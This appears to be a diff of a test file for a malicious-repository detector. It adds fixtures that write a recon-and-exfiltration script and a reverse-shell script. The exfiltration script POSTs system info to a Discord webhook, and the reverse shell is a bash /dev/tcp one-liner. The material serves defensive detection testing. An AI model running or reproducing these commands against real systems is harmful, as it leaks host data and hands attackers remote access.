@@ -65,12 +65,34 @@ def test_clone_rejects_invalid_full_name(tmp_path):
 
 
 def test_enumeration_only_does_not_confirm(tmp_path):
-    # eval #15: weak recon alone must not reach confirmation/gold.
+    # Recon WITHOUT an action phase is not an attack (a recon tool, or CI debug).
     (tmp_path / "recon.sh").write_text(
         "whoami\nuname -a\nid\nhostname\nnetstat -an\nifconfig\n", encoding="utf-8"
     )
     result = analyze_repo(tmp_path, "x/y")
     assert not result.confirmed
+
+
+def test_recon_and_exfil_implant_confirms(tmp_path):
+    # Full attack surface: enumeration PAIRED with egress is a recon-and-report
+    # implant -- exactly the "hidden network attack / viral implant" we hunt.
+    (tmp_path / "implant.sh").write_text(
+        "#!/bin/bash\nINFO=$(whoami; uname -a; id)\n"
+        "curl -X POST https://discord.com/api/webhooks/9/abc -d \"$INFO\"\n",
+        encoding="utf-8",
+    )
+    result = analyze_repo(tmp_path, "evil/implant")
+    assert result.confirmed
+    cats = {f.category for f in result.bash_findings}
+    assert "enumeration" in cats and "exfiltration" in cats
+
+
+def test_reverse_shell_confirms(tmp_path):
+    # A single unambiguous network-attack signature confirms on its own.
+    (tmp_path / "shell.sh").write_text(
+        "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", encoding="utf-8"
+    )
+    assert analyze_repo(tmp_path, "evil/rsh").confirmed
 
 
 def test_semgrep_flag_alone_does_not_confirm(monkeypatch, tmp_path):
